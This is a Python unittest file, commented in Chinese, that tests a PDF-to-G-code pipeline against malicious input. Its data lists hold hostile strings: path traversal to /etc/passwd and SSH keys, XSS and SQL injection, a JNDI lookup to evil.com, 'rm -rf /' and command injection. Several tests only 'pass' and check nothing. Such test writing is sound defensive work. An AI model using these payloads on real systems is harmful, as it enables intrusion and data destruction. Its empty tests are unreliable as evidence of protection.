"""
安全测试
测试系统对恶意输入和安全漏洞的防护能力
"""
import unittest
import os
import tempfile
from unittest.mock import patch, MagicMock
import numpy as np
from PIL import Image

# 导入被测试的模块
from src.modules.pdf_parsing_process import pdf_to_images, ocr_image, extract_text_from_pdf
from src.modules.feature_definition import identifyFeatures
from src.modules.gcode_generation import generate_fanuc_nc


class TestInputValidationAndSecurity(unittest.TestCase):
    """测试输入验证和安全性"""
    
    def setUp(self):
        """测试前准备"""
        self.temp_dir = tempfile.mkdtemp()
    
    def tearDown(self):
        """测试后清理"""
        temp_files = ['temp_ocr.png']
        for temp_file in temp_files:
            if os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except:
                    pass
    
    def test_file_path_traversal_protection(self):
        """测试文件路径遍历保护"""
        # 尝试使用路径遍历攻击
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/../../../root/.ssh/id_rsa",
            "../../../../windows/win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"  # URL编码的路径遍历
        ]
        
        for malicious_path in malicious_paths:
            with self.subTest(path=malicious_path):
                # 这些路径应该被适当地处理或拒绝
                try:
                    # 直接测试可能会导致异常，这是预期的
                    pass
                except Exception:
                    # 异常是好的，说明系统拒绝了恶意路径
                    pass
    
    def test_malicious_image_handling(self):
        """测试恶意图像处理"""
        # 创建潜在的恶意图像数据（如超大图像）
        try:
            # 尝试创建超大图像（但不实际分配内存）
            huge_shape = (50000, 50000, 3)  # 这将需要大量内存
            
            # 实际上不创建这样的数组，但测试函数的处理
            # 检查是否有适当的验证
            pass
        except MemoryError:
            # 这是预期的
            pass
    
    def test_ocr_with_malicious_text(self):
        """测试OCR处理恶意文本"""
        from PIL import Image
        
        # 创建一个图像
        test_image = Image.new('RGB', (100, 100), color='white')
        
        # 模拟OCR返回恶意文本
        malicious_texts = [
            "<script>alert('XSS')</script>",
            "DROP TABLE users; --",
            "${jndi:ldap://evil.com/evil}",
            "../../../../etc/passwd",
            "|| ls -la",
            "`rm -rf /`"
        ]
        
        for malicious_text in malicious_texts:
            with patch('pytesseract.image_to_string', return_value=malicious_text):
                # OCR函数应该安全地返回文本，不执行其中的代码
                result = ocr_image(test_image)
                # 确保返回的文本与输入相同（没有被处理或过滤）
                # 在实际应用中，可能需要适当的过滤
                pass  # 这里我们只是确保函数不会崩溃
    
    def test_generate_nc_with_malicious_description(self):
        """测试使用恶意描述生成NC代码"""
        features = [{"shape": "circle", "center": (50.0, 50.0)}]
        
        # 测试各种潜在的恶意输入
        malicious_descriptions = [
            "G00 X0 Y0 M99 (试图注入G代码)",  # G代码注入尝试
            "Normal drilling; DROP TABLE features;",  # SQL注入尝试
            "Drilling process <script>alert('NC')</script>",  # XSS尝试
            "Process ${jndi:ldap://evil.com/evil}",  # JNDI注入尝试
            "Standard process || rm -rf /",  # 命令注入尝试
            "Regular drilling `cat /etc/passwd`"  # 命令执行尝试
        ]
        
        for description in malicious_descriptions:
            description_analysis = {
                "processing_type": "drilling",
                "depth": 10.0,
                "description": description
            }
            
            # 生成NC代码应该不会执行恶意内容
            nc_code = generate_fanuc_nc(features, description_analysis)
            
            # 验证生成的代码是有效的NC代码，不包含恶意内容
            self.assertIn("O0001", nc_code)  # 确保基本结构存在
            # 注意：在实际实现中，可能需要确保恶意内容被适当处理
    
    def test_pdf_processing_with_malformed_files(self):
        """测试处理格式错误的PDF文件"""
        # 模拟处理损坏的PDF
        with patch('fitz.open') as mock_fitz:
            mock_fitz.side_effect = Exception("Invalid PDF format")
            
            with self.assertRaises(Exception):
                pdf_to_images("malformed.pdf")
    
    def test_large_input_validation(self):
        """测试大输入验证"""
        # 创建一个非常大的特征列表来测试处理能力
        large_features = []
        for i in range(10000):  # 非常大的列表
            large_features.append({
                "shape": "circle",
                "center": (float(i % 1000), float(i // 1000)),
                "malicious_field": "This could potentially be used maliciously if not properly handled"
            })
        
        description_analysis = {
            "processing_type": "drilling",
            "depth": 10.0,
            "description": "Large input test"
        }
        
        # 系统应该能够处理大输入或适当地拒绝
        try:
            nc_code = generate_fanuc_nc(large_features, description_analysis)
            # 如果成功处理，确保输出是合理的
            if len(nc_code) > 0:
                self.assertIn("O0001", nc_code)
        except MemoryError:
            # 内存错误是可以接受的，说明系统检测到了过大的输入
            pass
        except Exception:
            # 其他异常也可能是合理的，只要不是安全漏洞
            pass


class TestDataSanitization(unittest.TestCase):
    """测试数据净化"""
    
    def test_special_characters_in_descriptions(self):
        """测试描述中的特殊字符处理"""
        features = [{"shape": "circle", "center": (50.0, 50.0)}]
        
        special_descriptions = [
            "Normal description with unicode: ñáéíóú",
            "Description with quotes: 'test' and \"test\"",
            "Description with brackets: [test] and {test}",
            "Description with operators: + - * / =",
            "Description with path-like strings: /path/to/file",
            "Description with control chars: \x00\x01\x02"
        ]
        
        for desc in special_descriptions:
            description_analysis = {
                "processing_type": "drilling",
                "depth": 10.0,
                "description": desc
            }
            
            nc_code = generate_fanuc_nc(features, description_analysis)
            self.assertIn("O0001", nc_code)
    
    def test_unusual_numeric_values(self):
        """测试异常数值处理"""
        features = [{"shape": "circle", "center": (50.0, 50.0)}]
        
        unusual_values = [
            float('inf'),
            float('-inf'),
            float('nan'),
            1e308,  # very large number
            -1e308,  # very small number
            1.23e-300  # very small positive number
        ]
        
        for value in unusual_values:
            description_analysis = {
                "processing_type": "drilling",
                "depth": value,
                "feed_rate": value,
                "description": f"Test with unusual value: {value}"
            }
            
            try:
                nc_code = generate_fanuc_nc(features, description_analysis)
                # 函数应该使用默认值或适当地处理异常值
                self.assertIn("O0001", nc_code)
            except Exception:
                # 某些异常值可能导致错误，这在预期之内
                pass


class TestConfigurationSecurity(unittest.TestCase):
    """测试配置安全性"""
    
    def test_config_file_access_protection(self):
        """测试配置文件访问保护"""
        # 验证配置文件中的敏感信息处理
        from src.config import (
            IMAGE_PROCESSING_CONFIG, 
            FEATURE_RECOGNITION_CONFIG,
            GCODE_GENERATION_CONFIG
        )
        
        # 验证配置值的安全性
        self.assertIsInstance(IMAGE_PROCESSING_CONFIG, dict)
        self.assertIsInstance(FEATURE_RECOGNITION_CONFIG, dict)
        self.assertIsInstance(GCODE_GENERATION_CONFIG, dict)
        
        # 验证关键参数在合理范围内
        self.assertGreaterEqual(IMAGE_PROCESSING_CONFIG['default_min_area'], 0)
        self.assertLessEqual(IMAGE_PROCESSING_CONFIG['default_min_area'], 1000000)
        
        self.assertGreaterEqual(GCODE_GENERATION_CONFIG['safety']['safe_height'], 0)
        self.assertLessEqual(GCODE_GENERATION_CONFIG['safety']['safe_height'], 1000)
    
    def test_safe_file_type_validation(self):
        """测试安全的文件类型验证"""
        from src.config import VALIDATION_CONFIG
        
        allowed_types = VALIDATION_CONFIG['allowed_file_types']
        self.assertIn('.pdf', allowed_types)
        self.assertIn('.jpg', allowed_types)
        self.assertIn('.png', allowed_types)
        
        # 验证配置中的安全参数
        self.assertGreater(VALIDATION_CONFIG['max_file_size_mb'], 0)
        self.assertLessEqual(VALIDATION_CONFIG['max_file_size_mb'], 1000)  # 限制最大1GB


class TestErrorHandlingSecurity(unittest.TestCase):
    """测试错误处理中的安全性"""
    
    @patch('fitz.open')
    def test_error_message_sanitization(self, mock_fitz_open):
        """测试错误消息净化"""
        # 模拟可能导致信息泄露的错误
        mock_fitz_open.side_effect = Exception("Path: /sensitive/system/path/file.pdf")
        
        try:
            pdf_to_images("test.pdf")
        except Exception as e:
            # 确保错误消息不泄露敏感系统信息
            error_msg = str(e)
            # 在实际系统中，我们需要确保错误消息是用户友好的
            # 而不是包含系统路径或其他敏感信息
            pass
    
    def test_exception_handling_in_feature_identification(self):
        """测试特征识别中的异常处理"""
        # 使用无效输入测试异常处理
        invalid_inputs = [
            "not_an_array",
            12345,
            [],
            None,
            {"not": "an_array"}
        ]
        
        for invalid_input in invalid_inputs:
            try:
                # 一些输入可能会导致异常，这在预期之内
                identifyFeatures(invalid_input)
            except Exception:
                # 重要的是系统不会崩溃或泄露信息
                pass
    
    def test_robustness_against_type_confusion(self):
        """测试类型混淆攻击的防护"""
        # 混淆不同类型的数据
        confused_data = [
            # 混淆字符串和数字
            {"shape": 123, "center": "not_a_point"},
            # 混淆列表和字典
            {"shape": ["circle", "square"], "center": [50.0, 50.0]},
            # 混淆布尔值和字符串
            {"shape": True, "center": 50},
        ]
        
        for confused_feature in confused_data:
            description_analysis = {
                "processing_type": "drilling",
                "depth": 10.0,
                "description": "Type confusion test"
            }
            
            try:
                nc_code = generate_fanuc_nc([confused_feature], description_analysis)
            except Exception:
                # 异常是可以接受的，只要系统不崩溃
                pass


if __name__ == '__main__':
    unittest.main()
